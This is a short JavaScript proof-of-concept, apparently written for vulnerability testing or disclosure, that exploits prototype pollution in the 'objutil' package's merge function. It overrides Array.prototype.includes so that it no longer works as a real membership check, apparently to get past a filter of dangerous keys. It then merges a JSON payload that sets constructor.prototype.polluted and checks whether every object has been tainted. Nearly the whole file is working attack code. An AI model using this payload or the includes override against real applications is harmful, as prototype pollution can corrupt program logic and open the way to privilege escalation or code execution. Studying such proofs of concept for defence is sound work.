Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const {merge, remove} = require('objutil');
let a = {
    x: 1,
    y: {
        w: 1,
        z: 2
    }
};
const malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
console.log({}.polluted);
result = merge(a, JSON.parse(malicious_payload));
console.log({}.polluted);